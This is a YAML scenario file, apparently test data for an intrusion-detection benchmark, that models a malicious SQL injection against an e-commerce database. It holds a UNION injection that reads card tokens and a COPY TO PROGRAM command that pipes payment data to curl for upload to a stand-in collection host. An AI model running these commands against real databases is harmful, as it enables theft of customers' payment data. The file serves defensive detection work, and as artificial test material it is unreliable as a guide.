scenario_id: ecommerce_sqli_mal_02
family_id: ecommerce_sqli_union_payments
domain: ecommerce
matched_pair_id: ecommerce_sqli_pair_02
matched_dimensions:
  fixed: [process_tree_shape, syscall_sequence, timing_pattern, role]
  varied: [sql_content]
time_of_day: "22:25"
default_class: malicious
rule_engine_relationship: agrees
sessions:
  - session_label: inject
    role: analytics_etl_service
    anchor: db
    timing:
      tempo: steady
      step_gaps_seconds: [2.5]
    events:
      - step_id: probe
        sql: "SELECT order_id, total_amount FROM orders WHERE order_id = -1 UNION SELECT payment_id, card_token FROM payments"
      - step_id: exfil
        sql: "COPY (SELECT card_token, card_last4, amount FROM payments) TO PROGRAM 'curl -sX POST https://analytics-mirror.datasink.example/collect -d @-'"
        connects_to: {ip: "141.98.11.47", port: 5555}
